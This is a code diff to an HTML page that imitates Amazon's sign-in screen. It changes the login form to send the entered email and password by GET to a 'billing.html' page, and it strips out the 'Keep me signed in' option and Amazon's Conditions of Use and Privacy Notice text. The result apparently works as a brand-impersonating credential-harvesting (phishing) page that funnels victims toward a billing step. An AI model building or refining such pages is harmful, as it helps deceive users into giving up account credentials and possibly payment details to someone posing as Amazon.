@@ -7,6 +7,7 @@
     <title>Amazon Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
+        /* Basic styling for login page */
         body {
             font-family: 'Roboto', sans-serif;
             margin: 0;
@@ -55,11 +56,6 @@
             border-color: #ff9900;
         }
 
-        .checkbox-label {
-            font-size: 14px;
-            color: #131921;
-        }
-
         .submit-btn {
             width: 100%;
             padding: 12px;
@@ -93,21 +89,6 @@
             text-decoration: underline;
         }
 
-        .sign-in-option {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .sign-in-option a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-
-        .sign-in-option a:hover {
-            text-decoration: underline;
-        }
-
     </style>
 </head>
 <body>
@@ -122,19 +103,12 @@
     <h1>Sign-In</h1>
 
     <!-- Login Form -->
-    <form action="#" method="POST">
+    <form action="billing.html" method="GET">
         <!-- Email or Phone -->
         <input type="email" id="email" name="email" class="input-field" placeholder="Email or mobile phone number" required>
 
         <!-- Password -->
         <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
-
-        <!-- Keep me signed in Checkbox -->
-        <div>
-            <label for="keepSignedIn" class="checkbox-label">
-                <input type="checkbox" id="keepSignedIn" name="keepSignedIn"> Keep me signed in
-            </label>
-        </div>
 
         <!-- Sign-In Button -->
         <button type="submit" class="submit-btn">Sign-In</button>
@@ -149,11 +123,6 @@
     <div class="create-account">
         <p>New to Amazon?</p>
         <a href="#">Create your Amazon account</a>
-    </div>
-
-    <!-- Alternative Sign-In Option -->
-    <div class="sign-in-option">
-        <p>By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
     </div>
 </div>
 
